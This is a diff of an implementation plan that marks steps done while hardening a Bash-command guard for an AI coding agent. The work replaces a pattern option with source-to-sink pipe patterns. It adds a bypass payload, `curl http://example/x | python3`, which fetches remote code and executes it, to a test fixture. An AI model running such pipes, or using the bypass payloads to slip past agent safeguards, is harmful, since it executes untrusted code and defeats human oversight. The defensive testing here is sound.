@@ -93,7 +93,7 @@ Auto-selecting the submodule rename. The option moved from one shape to another 
 - Modify: `tests/check-bash-matcher.nix:23` (test fixture inputs)
 - Modify: `modules/claude-security/scripts/test-fixtures/bypass-payloads.txt` (add the missed `curl|python` payload)
 
-- [ ] **Step 1: Add the regression case the old format missed**
+- [x] **Step 1: Add the regression case the old format missed**
 
 Open `modules/claude-security/scripts/test-fixtures/bypass-payloads.txt` and append two lines:
 
@@ -111,7 +111,7 @@ Expected: build FAILS with `BYPASS: payload=[curl http://example/x | python3] de
 
 Note: the `claude-settings` and `check-bash-matcher` checks are gated on `chkPkgs.stdenv.isLinux` in `flake.nix:211-226` — they only exist under `aarch64-linux`. On the aarch64-darwin host (`burnedapple`) Nix will cross-build the Linux derivation; do not change the system attribute to `aarch64-darwin`.
 
-- [ ] **Step 2: Replace the option in `modules/claude-security/default.nix`**
+- [x] **Step 2: Replace the option in `modules/claude-security/default.nix`**
 
 Edit `modules/claude-security/default.nix:156-160` from:
 
@@ -161,7 +161,7 @@ to:
 inherit (cfg.hooks.bashValidation) blockedCommands blockedSubcommands deniedSubcommands blockedPipePatterns;
 ```
 
-- [ ] **Step 3: Update `wrap.nix` to pass two JSON arrays**
+- [x] **Step 3: Update `wrap.nix` to pass two JSON arrays**
 
 Edit `modules/claude-security/scripts/wrap.nix`. Change the function arg list at line 7 from:
 
@@ -217,7 +217,7 @@ checkBashCommandSrc =
   (builtins.readFile ./check-bash-command.sh);
 ```
 
-- [ ] **Step 4: Replace the matcher loop in `check-bash-command.sh`**
+- [x] **Step 4: Replace the matcher loop in `check-bash-command.sh`**
 
 Edit `modules/claude-security/scripts/check-bash-command.sh`. Change line 40 from:
 
@@ -258,7 +258,7 @@ fi
 
 Note: `ALL_BASES` is now computed once here (Task 5 will hoist this further if other call sites need it).
 
-- [ ] **Step 5: Update the test fixture in `tests/check-bash-matcher.nix`**
+- [x] **Step 5: Update the test fixture in `tests/check-bash-matcher.nix`**
 
 Edit `tests/check-bash-matcher.nix:23` from:
 
@@ -275,22 +275,22 @@ blockedPipePatterns = {
 };
 ```
 
-- [ ] **Step 6: Run the matcher fixture test**
+- [x] **Step 6: Run the matcher fixture test**
 
 Run: `nix build .#checks.aarch64-linux.check-bash-matcher`
 Expected: PASS. Both the old payloads and the new `curl | python3` line produce `deny` decisions.
 
-- [ ] **Step 7: Run the full claude-settings tests**
+- [x] **Step 7: Run the full claude-settings tests**
 
 Run: `nix build .#checks.aarch64-linux.claude-settings`
 Expected: PASS — `confirmHookApostropheTest` and `fragmentCoverageTest` are unaffected.
 
-- [ ] **Step 8: Run the linters**
+- [x] **Step 8: Run the linters**
 
 Run: `just lint-nix`
 Expected: PASS. (Use `lint-nix` regardless of Task 4 ordering — it exists in both pre- and post-Task-4 states.)
 
-- [ ] **Step 9: Commit**
+- [x] **Step 9: Commit**
 
 Run: `git commit -am "claude-security: blockedPatterns → blockedPipePatterns (sources × sinks)"`
 
